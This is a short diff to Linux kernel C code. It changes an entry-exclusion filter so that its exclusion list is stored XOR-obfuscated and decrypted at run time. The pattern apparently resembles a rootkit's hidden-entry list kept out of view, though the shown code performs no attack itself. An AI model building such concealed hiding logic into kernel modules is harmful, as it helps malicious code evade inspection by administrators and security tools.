@@ -1,11 +1,14 @@
+#include "utils/excludes/string_filtering.h"
+
 #include <linux/fs.h>
 #include <linux/file.h>
 #include <linux/string.h>
 
-#include "utils/excludes/string_filtering.h"
+#include "utils/encrypt_utils.h"
 
 int string_exclusions_are_empty() {
-    return STRING_EXCLUDES[0] == '\0';
+    char excludes[] = STRING_EXCLUDES;
+    return excludes[0] == '\0';
 }
 
 int str_entry_is_excluded(const char *entry) {
@@ -14,6 +17,8 @@ int str_entry_is_excluded(const char *entry) {
     }
 
     char excludes[] = STRING_EXCLUDES; // copy to a mutable array
+    xor_decrypt(excludes); // xor decrypt
+
     char *token;
     char *temp_excludes = excludes; // `strsep` modifies the original string
 
